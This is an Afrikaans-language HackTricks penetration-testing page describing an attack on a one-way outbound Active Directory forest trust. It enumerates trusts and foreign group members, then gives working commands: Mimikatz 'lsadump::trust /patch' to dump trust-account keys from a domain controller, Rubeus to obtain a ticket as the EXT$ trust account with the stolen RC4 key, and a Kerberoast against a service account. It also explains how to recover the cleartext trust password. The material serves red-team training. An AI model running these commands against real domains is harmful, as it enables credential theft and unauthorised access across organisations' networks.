# Eksterne Woud-Domein - Eenrigting (Uitgaand)

{{#include ../../banners/hacktricks-training.md}}

In hierdie scenario **jou domein** is **vertrou** op sommige **privileges** aan 'n hoof van **verskillende domeine**.

## Enumerasie

### Uitgaande Vertroue
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Trust Account Attack

'n Sekuriteitskwesie bestaan wanneer 'n vertrouensverhouding tussen twee domeine gevestig word, hier geïdentifiseer as domein **A** en domein **B**, waar domein **B** sy vertroue na domein **A** uitbrei. In hierdie opstelling word 'n spesiale rekening in domein **A** geskep vir domein **B**, wat 'n belangrike rol speel in die verifikasieproses tussen die twee domeine. Hierdie rekening, geassosieer met domein **B**, word gebruik om kaartjies te enkripteer vir toegang tot dienste oor die domeine.

Die kritieke aspek om hier te verstaan, is dat die wagwoord en hash van hierdie spesiale rekening uit 'n Domeinbeheerder in domein **A** onttrek kan word met behulp van 'n opdraglyn hulpmiddel. Die opdrag om hierdie aksie uit te voer is:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Hierdie ekstraksie is moontlik omdat die rekening, geïdentifiseer met 'n **$** na sy naam, aktief is en behoort tot die "Domain Users" groep van domein **A**, wat die regte wat met hierdie groep geassosieer word, erf. Dit stel individue in staat om teen domein **A** te autentiseer met die kredensiale van hierdie rekening.

**Waarskuwing:** Dit is haalbaar om hierdie situasie te benut om 'n voet in die deur te kry in domein **A** as 'n gebruiker, hoewel met beperkte regte. Hierdie toegang is egter voldoende om enumerasie op domein **A** uit te voer.

In 'n scenario waar `ext.local` die vertrouende domein is en `root.local` die vertroude domein is, sal 'n gebruikersrekening genaamd `EXT$` binne `root.local` geskep word. Deur spesifieke gereedskap is dit moontlik om die Kerberos vertrouingssleutels te dump, wat die kredensiale van `EXT$` in `root.local` onthul. Die opdrag om dit te bereik is:
```bash
lsadump::trust /patch
```
Hierdie kan gebruik word om die onttrokken RC4-sleutel te gebruik om as `root.local\EXT$` binne `root.local` te autentiseer met 'n ander hulpmiddelopdrag:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Hierdie autentikasie stap maak die moontlikheid oop om dienste binne `root.local` te enumerate en selfs te exploiteer, soos om 'n Kerberoast-aanval uit te voer om diensrekening geloofsbriewe te onttrek met:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Versameling van duidelike teks vertrou password

In die vorige vloei is die vertrou hash gebruik in plaas van die **duidelike teks wagwoord** (wat ook **deur mimikatz gedump** is).

Die duidelike teks wagwoord kan verkry word deur die \[ CLEAR ] uitvoer van mimikatz van heksadesimaal te omskakel en null bytes ‘\x00’ te verwyder:

![](<../../images/image (938).png>)

Soms, wanneer 'n vertrou verhouding geskep word, moet 'n wagwoord deur die gebruiker vir die vertrou ingetik word. In hierdie demonstrasie is die sleutel die oorspronklike vertrou wagwoord en dus menslik leesbaar. Soos die sleutel siklusse (30 dae), sal die duidelike teks nie menslik leesbaar wees nie, maar tegnies steeds bruikbaar.

Die duidelike teks wagwoord kan gebruik word om gereelde outentisering as die vertrou rekening uit te voer, 'n alternatief om 'n TGT aan te vra met die Kerberos geheime sleutel van die vertrou rekening. Hier, om root.local van ext.local te vra vir lede van Domain Admins:

![](<../../images/image (792).png>)

## Verwysings

- [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

{{#include ../../banners/hacktricks-training.md}}
